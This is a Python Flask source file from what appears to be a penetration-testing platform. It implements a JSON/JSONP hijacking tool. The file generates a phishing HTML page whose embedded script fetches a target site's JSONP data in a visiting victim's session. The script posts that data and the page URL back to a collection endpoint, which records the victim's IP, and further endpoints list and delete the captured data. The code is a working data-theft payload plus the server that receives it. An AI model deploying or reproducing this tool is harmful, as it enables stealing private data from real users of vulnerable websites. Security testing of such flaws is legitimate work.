#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2019/2/14
# @File    : json_hijacker.py
# @Desc    : ""

import time
from flask import request
from bson import ObjectId
from flask_restful import Resource, reqparse
from fuxi.core.databases.database import MongoDB, T_JSON_HIJACKER_TASK, T_JSON_HIJACKER_RES
from fuxi.common.utils.logger import logger
from fuxi.common.libs.data import API_FAILED
from fuxi.common.libs.core.token import access_token


parser = reqparse.RequestParser()
parser.add_argument('name', type=str)
parser.add_argument('path', type=str)
parser.add_argument('d', type=str)
parser.add_argument('s', type=str)


class JsonHijackingTask(Resource):
    @access_token
    def get(self):
        data = []
        try:
            items = MongoDB(T_JSON_HIJACKER_TASK).find().sort("date", -1)
            for item in items:
                count = MongoDB(T_JSON_HIJACKER_RES).find({"t_id": str(item['_id'])}).count()
                tmp_data = {
                    "tid": str(item['_id']),
                    'name': item['name'],
                    'target': item['target'],
                    'date': item['date'],
                    'count': count,
                }
                data.append(tmp_data)
            return {'code': 10200, 'status': 'success', 'message': '', 'data': data}
        except Exception as e:
            logger.error("get json hijack task info failed: " + str(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}

    @access_token
    def post(self):
        try:
            args = parser.parse_args()
            target = args['path']
            path = target.split('?')[0]
            if "?" in target:
                json_link = target + "&callback="
            else:
                json_link = target + "?callback="
            html_content = ("<meta name='referrer' content='never'><p>Hi</p><script type='text/javascript'"
                            "src='https://cdn.bootcss.com/jquery/1.9.1/jquery.min.js'></script>"
                            "<script type='text/javascript'> $.getJSON('%s?', function(jsonData)"
                            "{ console.log(jsonData); $.post('/api/v1/tools/json/data',"
                            "{d:JSON.stringify(jsonData),s:document.URL}); }); </script>") % json_link
            data_save = {
                "name": args['name'],
                "target": path,
                "phishing": path,
                "html": html_content,
                "date": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            }
            t_id = MongoDB(T_JSON_HIJACKER_TASK).insert_one(data_save)
            logger.success("created the json hijacker task: {}".format(t_id))
            return {'code': 10200, 'status': 'success', 'message': 'The task was created successfully', 'data': ""}
        except Exception as e:
            logger.error("created the json hijacker task failed: {}".format(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}


class JsonHijackerAction(Resource):
    @access_token
    def get(self, tid):
        try:
            data = []
            task_item = MongoDB(T_JSON_HIJACKER_TASK).find_one({"_id": ObjectId(tid)})
            task_res = MongoDB(T_JSON_HIJACKER_RES).find({"t_id": tid}).sort("date", -1)
            index = 0
            for item in task_res:
                index += 1
                tmp_data = {
                    "index": index,
                    "vid": str(item['_id']),
                    'name': task_item['name'],
                    'target': task_item['target'],
                    'res': item['res'],
                    'ip': item['ip'],
                    'date': item['date'],
                }
                data.append(tmp_data)
            return {'code': 10200, 'status': 'success', 'message': '', 'data': data}
        except Exception as e:
            logger.error("get json result failed: {}".format(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}

    @access_token
    def delete(self, tid):
        try:
            MongoDB(T_JSON_HIJACKER_TASK).delete_one({"_id": ObjectId(tid)})
            return {'code': 10200, 'status': 'success', 'message': 'deleted successfully'}
        except Exception as e:
            logger.error("delete json task failed: {}".format(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}


class JsonHijackerDataAction(Resource):
    @access_token
    def get(self, vid):
        try:
            data = MongoDB(T_JSON_HIJACKER_RES).find_one({"_id": ObjectId(vid)})
            data['_id'] = str(data['_id'])
            return {'code': 10200, 'status': 'success', 'message': '', 'data': data}
        except Exception as e:
            logger.error("delete jsonp data failed: {}".format(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}

    @access_token
    def delete(self, vid):
        try:
            MongoDB(T_JSON_HIJACKER_RES).delete_one({"_id": ObjectId(vid)})
            return {'code': 10200, 'status': 'success', 'message': 'deleted successfully'}
        except Exception as e:
            logger.error("delete jsonp data failed: {}".format(e))
            return {'code': 10501, 'status': 'error', 'message': API_FAILED}


class JsonPhishingData(Resource):
    @staticmethod
    def post():
        """
        POST /api/v1/tools/json/data
        :return:
        """
        try:
            args = parser.parse_args()
            res = args['d']
            source = args['s']
            data_save = {
                "t_id": source.split('/')[-1],
                "res": res,
                "ip": request.remote_addr,
                "date": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            }
            v_id = MongoDB(T_JSON_HIJACKER_RES).insert_one(data_save)
            logger.success("save phishing data: {}".format(v_id))
            return {'code': 10200, 'status': 'success', 'message': 'success'}
        except Exception as e:
            logger.error("save phishing data error: " + str(e))
            return {'code': 10501, 'status': 'failed', 'message': API_FAILED}
